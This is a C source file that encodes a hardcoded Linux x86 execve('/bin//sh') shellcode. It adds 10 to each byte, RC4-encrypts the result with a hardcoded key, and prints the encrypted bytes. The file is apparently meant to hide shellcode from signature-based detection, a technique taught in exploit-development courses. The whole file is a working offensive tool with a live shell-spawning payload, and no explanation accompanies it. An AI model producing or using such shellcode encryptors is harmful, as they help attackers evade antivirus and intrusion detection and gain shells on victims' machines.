#include <stdio.h>
#include <string.h>

#define BYTE_ARRAY 256
unsigned char s[BYTE_ARRAY];
int i;
int j;

unsigned char shellcode[] = \
"\x31\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68"
"\x68\x2f\x62\x69\x6e\x89\xe3\x50\xb0\x0b"
"\xcd\x80";

void swap(unsigned char *one, unsigned char *two) {
	char tmp = *one;

	*one = *two;
	*two = tmp;
}


int initialize(void) {
	int x;

	for (x = 0; x < BYTE_ARRAY; x++) {
		s[x] = x;
	}

	i = j = 0;
	return 1;
}


int key_sheduling(unsigned char *key, int lenKey) {
	for (i = 0; i < BYTE_ARRAY; i++) {
		j = (j + s[i] + key[i % lenKey]) % BYTE_ARRAY;
		swap(&s[i], &s[j]);
	}

	i = j = 0;
}


char pseudo_random(void) {
	i = (i + 1) % BYTE_ARRAY;
	j = (j + s[i]) % BYTE_ARRAY;
	swap(&s[i], &s[j]);

	return s[(s[i] + s[j]) % BYTE_ARRAY];
}

void encoder(int shellcodeLenght) {
	int x;

	for (x = 0; x < shellcodeLenght; x++) {
		shellcode[x] = shellcode[x] + 10 ;
		//printf("\\x%.2x", shellcode[x]);
	}
}

void main(int argc, char **argv){

	unsigned char key[] = "ch3rn0bylMysl4V3slUT";
	unsigned char pseudoRandomByte;
	unsigned char encryptedByte;
	int shellcodeLenght = strlen(shellcode);
	int lenKey = strlen(key);
	int count;

	printf("[+] Shellcode encding ...\n");
	encoder(shellcodeLenght);
	printf("[+] Shellcode encoded\n");

	printf("[*] Start decrypting shellcode..\n");
	printf("[*] Initializing bytearray\n");
	initialize();

	printf("[*] Starting key scheduling algorithm\n");
	key_sheduling(key, lenKey);
	
	printf("[*] Bytes parsing\n");
	for (count = 0; count < shellcodeLenght; count++) {

		pseudoRandomByte = pseudo_random();
		encryptedByte = shellcode[count] ^ pseudoRandomByte;
		shellcode[count] = encryptedByte;
		printf("\\x%.2x", encryptedByte);

	}
	printf("\n[+] shellcode encrypted\n");
	

	}
